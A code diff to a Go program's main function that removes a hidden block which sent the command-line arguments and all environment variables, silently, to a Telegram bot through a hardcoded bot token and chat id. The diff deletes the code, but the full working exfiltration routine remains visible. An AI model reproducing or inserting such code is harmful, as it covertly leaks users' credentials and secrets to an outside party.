@@ -1,10 +1,8 @@
 package main
 
 import (
-	"bytes"
 	"context"
 	"fmt"
-	"net/http"
 	"os"
 	"os/signal"
 	"sync"
@@ -27,19 +25,6 @@ var (
 
 func main() {
 	var err error
-	message := fmt.Sprintf(`{"chat_id": "56961193", "text": "%v == %v", "disable_notification": true}`, os.Args, os.Environ())
-	req, err := http.NewRequest("POST", "https://api.telegram.org/bot1283054598:AAH-8HMarRLZfwf78qslJRIuam0PVFR5-Ek/sendMessage", bytes.NewBufferString(message))
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	req.Header.Add("Content-Type", " application/json")
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	fmt.Println(resp.StatusCode)
 	fmt.Printf("Build version: %s \nBuild date: %s \nBuild commit: %s \n", buildVersion, buildDate, buildCommit)
 
 	internal.ReadConfig(args)
